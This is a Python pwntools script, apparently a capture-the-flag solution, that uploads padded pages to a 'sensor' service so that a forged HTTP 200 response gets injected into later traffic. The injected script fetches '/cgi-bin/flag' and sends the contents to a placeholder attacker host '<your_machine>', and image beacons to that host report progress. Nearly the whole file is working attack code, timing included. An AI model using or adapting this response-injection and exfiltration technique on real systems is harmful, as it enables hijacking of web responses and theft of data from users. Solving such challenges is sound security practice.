from pwn import *
import os
import time


token = os.environ['SENSOR_TOKEN']

context.log_level = "debug"

# Try to connect to remote until succeeding
while True:
    try:
        io = remote(os.environ['TARGET_IP'], int(os.environ['SENSOR_PORT']))
        break
    except Exception as e:
        print("error"+str(e))




pre_a = """
<html>
    <body>
        <img src="http://<your_machine>/start_of_cam_one_a"/>
    """


pre_b = """
<html>
    <body>
        <img src="http://<your_machine>/start_of_cam_one_b"/>

    """


end_b = """
        <img src="http://<your_machine>/end_of_cam_one_b"/>
    </body>
</html>
    """

end_a = """
        <img src="http://<your_machine>/end_of_cam_one_a"/>
    </body>
</html>
    """


preppage = """
<html>
    <body>
        <img src="http://<your_machine>/start_of_prep"/>
        <Iframe src='./camone?0'></iframe>
        <Iframe src='./camone?1'></iframe>
        <Iframe src='./camone?2'></iframe>
        <Iframe src='./camone?3'></iframe>
        <Iframe src='./camone?4'></iframe>
        <Iframe src='./camone?5'></iframe>
        <Iframe src='./camone?6'></iframe>
        <Iframe src='./camone?7'></iframe>
        <img src="http://<your_machine>/end_of_prep"/>
    </body>
</html>
"""

injectedHTMLPayload = """
<html>
    <body>
        <h1>WHAT</h1>
        <script>
        document.write('<img src="http://<your_machine>/inside"/>')
            fetch("/cgi-bin/flag").then(r => r.text()).then(flag => fetch("http://<your_machine>/flag?" + flag))
        </script>
    </body>
</html>"""

injectedResponse = "HTTP/1.1 200 OK\r\n"+"Content-Length:"+str(len(injectedHTMLPayload))+"\r\n"+"Connection: keep-alive\r\n"+"\r\n"+injectedHTMLPayload.ljust(1448)

MAX_LEN = 300 * 1448

def setDummy(io): 
    payload = pre_a
    number_of_fillers = (MAX_LEN -len(end_a) -len(pre_a))
    payload += number_of_fillers * "A"
    payload += end_a        
    io.sendline("camone")
    io.sendline(str(len(payload)))
    io.send_raw(bytes(payload, "utf-8"))

def setReal(io): 
    payload = pre_b
    number_of_fillers = (MAX_LEN -len(end_b) -len(pre_b))
    payload += number_of_fillers * "B"
    payload += end_b
    payload += (50*str(injectedResponse))       
        
    io.sendline("camone")
    io.sendline(str(len(payload)))
    io.send_raw(bytes(payload, "utf-8"))




def setPrepPage(io): 
    payload = preppage    
    io.sendline("prep")
    io.sendline(str(len(payload)))
    io.send_raw(bytes(payload, "utf-8"))




    
io.sendline(token)


info("sending preppage")
setPrepPage(io)

info("sending dummy")
setDummy(io)
info("finished sending dummy")

time.sleep(5.05)
info("sending real")
setReal(io)
info("finished sending real")


